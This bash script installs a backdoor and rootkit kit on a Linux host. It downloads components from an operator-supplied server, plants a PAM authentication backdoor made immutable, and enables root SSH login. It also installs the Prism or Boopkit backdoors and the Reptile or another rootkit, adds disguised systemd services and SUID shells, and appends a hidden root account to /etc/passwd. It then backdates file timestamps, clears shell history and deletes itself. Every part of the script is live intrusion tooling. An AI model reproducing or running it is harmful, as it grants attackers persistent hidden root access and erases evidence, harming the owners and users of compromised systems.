#!/bin/bash

# Validate input
if [ $# -ne 1 ]; then
    echo "Usage: $0 <server_ip:port>"
    exit 1
fi
SERV_IP_PORT="$1"

# Check for wget or curl
FETCH_CMD="wget"
if ! command -v wget &>/dev/null; then
    FETCH_CMD="curl -O"
fi

# Determine package manager
PKG_MANAGER=""
if command -v apt &>/dev/null; then
    PKG_MANAGER="apt install -y"
    sudo killall apt apt-get dpkg
    sudo apt update
elif command -v yum &>/dev/null; then
    PKG_MANAGER="yum install -y"
elif command -v dnf &>/dev/null; then
    PKG_MANAGER="dnf install -y"
elif command -v pacman &>/dev/null; then
    PKG_MANAGER="pacman -S --noconfirm"
else
    exit 1
fi

# Create directories
mkdir -p /var/opt/bds4 /opt/bds4
cd /var/opt/bds4

# Backdoor PAM
$FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
$PKG_MANAGER libpam0g-dev gcc
gcc -fPIC -shared -o bds4_pam.so pam_backdoor.c
mv bds4_pam.so /etc/pam.d

# Modify PAM configuration
PAM_SO_PATH="/etc/pam.d/bds4_pam.so"
PAM_FILE="/etc/pam.d/common-auth"
if ! grep -qF "$PAM_SO_PATH" "$PAM_FILE"; then
    awk -v newline="auth    sufficient                      $PAM_SO_PATH" '
        NF > 0 && $1 !~ /^#/ && !done {
            print newline;
            $0 = $0 " use_first_pass";
            done = 1;
        }
        { print }
    ' "$PAM_FILE" > /tmp/.pam_temp && mv /tmp/.pam_temp "$PAM_FILE"
fi

chattr +i /etc/pam.d/common-auth
chattr +i /etc/pam.d/bds4_pam.so

# Enable root login
if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
    sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
else
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
fi
systemctl restart sshd 2>/dev/null
systemctl restart ssh 2>/dev/null

# Determine kernel version
KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)

# Install Prism or Boopkit based on kernel version
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/prism.tar.gz 
    tar -xvf prism.tar.gz
    rm prism.tar.gz
    cd prism
    $PKG_MANAGER gcc
    gcc -DDETACH -m64 -Wall -s -o bds4_sys prism.c || mv bds4_sys /opt/bds4/
    mv bds4_sys /opt/bds4/
    /opt/bds4/bds4_sys
    cd /var/opt/bds4
else
    $FETCH_CMD $SERV_IP_PORT/boopkit.tar.gz boopkit.tar.gz
    tar -xvf boopkit.tar.gz
    rm boopkit.tar.gz
    cd boopkit
    $PKG_MANAGER clang make libbpf-dev gcc-multilib llvm libxdp-dev libpcap-dev
    make
    make install || (mv /usr/bin/boopkit /opt/bds4/bds4_sys && rm -f /usr/bin/boopkit-boop)
    mv /usr/bin/boopkit /opt/bds4/bds4_sys
    rm -f /usr/bin/boopkit-boop
    mkdir -p /opt/bds4/boopkit
    for iface in $(ip a | awk -F': ' '$2 !~ "lo|docker|[0-9]+" {print $2}' | tr -d ' '); do
        /opt/bds4/bds4_sys -i "$iface" -q &
    done
    cd /var/opt/bds4
fi

# Create systemd services
cat > /etc/systemd/system/bds4_sys.service <<EOF
[Unit]
Description=BDS4 System Service
After=network.target

[Service]
Type=forking
ExecStart=/opt/bds4/bds4_$( [ "$KERNEL_MAJOR" -le 4 ] && echo "sys" || echo "sys -q" )
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
EOF

systemctl enable bds4_sys.service
systemctl start bds4_sys.service

if [ "$KERNEL_MAJOR" -le 4 ]; then
    cat > /etc/systemd/system/bds4_stat.service <<EOF
[Unit]
Description=BDS4 Status Service
After=network.target

[Service]
Type=oneshot
ExecStart=/lib/udev/bds4
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable bds4_stat.service
    systemctl start bds4_stat.service
fi

# Set SUID bits
chmod u+s $(which ip) $(which chroot)
cp $(which dash) /usr/lib/openssh/ssh_keygen
chmod u+s /usr/lib/openssh/ssh_keygen

# Install net-tools
$PKG_MANAGER net-tools

# Install rootkit
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/reptile.tar.gz
    tar -xvf reptile.tar.gz
    rm reptile.tar.gz
    cd bds4
    $PKG_MANAGER gcc make build-essential linux-headers-$(uname -r)
    make defconfig
    make
    make install
    cd /var/opt/bds4
    echo '#<reptile>' >> /etc/passwd
    echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
    echo '#</reptile>' >> /etc/passwd
else
    sysctl kernel.ftrace_enabled=1
    $FETCH_CMD $SERV_IP_PORT/bds.tar.gz
    tar -xvf bds.tar.gz
    rm bds.tar.gz
    cd bds
    ./install.sh
    cd /var/opt/bds4
fi

rm -rf /var/opt/bds4/*

# Change file dates
touch -d "Aug 2 2018" "/etc/passwd"
touch -d "May 23 2020" "/etc/systemd/system"
touch -d "Jun 14 2018" "/etc/pam.d"
touch -d "Aug 2 2018" "/opt"
touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"

# Clear history
 history -c
rm -f $HISTFILE

# Delete script
rm -f $0